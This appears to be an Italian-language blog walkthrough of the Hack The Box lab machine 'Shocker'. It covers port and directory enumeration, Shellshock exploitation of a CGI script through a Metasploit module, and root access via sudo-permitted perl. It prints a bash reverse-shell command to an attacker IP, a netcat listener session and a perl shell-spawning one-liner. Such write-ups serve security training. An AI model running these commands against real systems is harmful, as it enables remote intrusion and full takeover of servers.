---
title: Shocker Walkthrough
description: Shocker, sebbene complessivamente piuttosto semplice, dimostra la gravità della famosa vulnerabilità Shellshock, che ha colpito milioni di server esposti pubblicamente.
author: dua2z3rr
date: 2025-10-22 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Vulnerability Assessment", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Vulnerabilità: Remote Code Execution", "Codice: Bash", "Codice: Perl", "Servizio: Apache", "Servizio: CGI", "Tecnica: Reconnaissance", "Tecnica: Web Site Structure Discovery", "Tecnica: SUDO Exploitation"]
image: /assets/img/shocker/shocker-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo con uno scan delle porte.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.56 -vv -p-
<SNIP>
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.56 -vv -p 80,2222 -sC -sV
<SNIP>
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Nel primo scan, vediamo che sulla porta 2222 viene rilevato il servizio `EtherNetIP-1`. Questo tuttavia è scorretto, perchè in realtà è presente **ssh**. Il primo risultato è diverso da ssh perchè è il servizio di default assegnato dalla **IANA** a quella porta.
{: .prompt-info }

### HTTP

Andando sulla porta 80 ci ritroviamo con una pagina particolare.

![Desktop View](/assets/img/shocker/shocker-dont-bug-me.png)

Non è definitamente ciò che mi aspettavo.

### Fuff

Procediamo al fuzzing del sito.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt:FUZZ -u 'http://10.10.10.56/FUZZ/' -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ/
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cgi-bin                 [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 146ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 119ms]
icons                   [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 109ms]
```

> Attivare la ricorsione non fa vedere le directory desiderate.
{: .prompt-danger }

### Enumerazione script

Utilizzando una wordlist di piccole dimensioni che potrebbe contenere i nomi degli script, enumeriamo gli script sul sito.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w /usr/share/wordlists/dirb/small.txt -u http://10.10.10.56/cgi-bin/FUZZ.sh -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ.sh
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

user                    [Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 63ms]
:: Progress: [959/959] :: Job [1/1] :: 694 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Esiste lo script **user.sh**

### Reverse Engineering

Visitando tramite browser lo script, otteniamo questo:

```text
Content-Type: text/plain

Just an uptime test script

 11:58:33 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
```

Dopo una breve ricerca, scopriamo che si tratta dell'output del comando **uptime**.

### Exploit

Possiamo usare il modulo di metasploit **scanner/http/apache_mod_cgi_bash_env** con queste opzioni:

```shell
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/apache_mod_cgi_bash_env) >> options

Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):

   Name       Current Setting                                Required  Description
   ----       ---------------                                --------  -----------
   CMD        /bin/bash -i >& /dev/tcp/10.10.16.9/9001 0>&1  yes       Command to run (absolute paths required)
   CVE        CVE-2014-6271                                  yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER     User-Agent                                     yes       HTTP header to use
   METHOD     GET                                            yes       HTTP method to use
   Proxies                                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
   RHOSTS     10.10.10.56                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                                             yes       The target port (TCP)
   SSL        false                                          no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin/user.sh                               yes       Path to CGI script
   THREADS    1                                              yes       The number of concurrent threads (max one per host)
   VHOST                                                     no        HTTP server virtual host
```

Utilizzaimo il comando `nc -lnvp 9001` e eseguiamo l'exploit. Otteniamo una reverse shell.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001

Connection received on 10.10.10.56 47902
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

Prendiamo la user flag.

## Shell come shelly

### Enumerazione Interna

Usiamo il comando `sudo -l` per vedere i comandi che possiamo eseguire come root.

```shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Possiamo eseguire perl come root.

### Privilege Escalation

Eseguiamo una semplice privilege escalation creando una shell tramite perl.

```shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
root
```

Prendiamo la root flag e terminiamo la box.
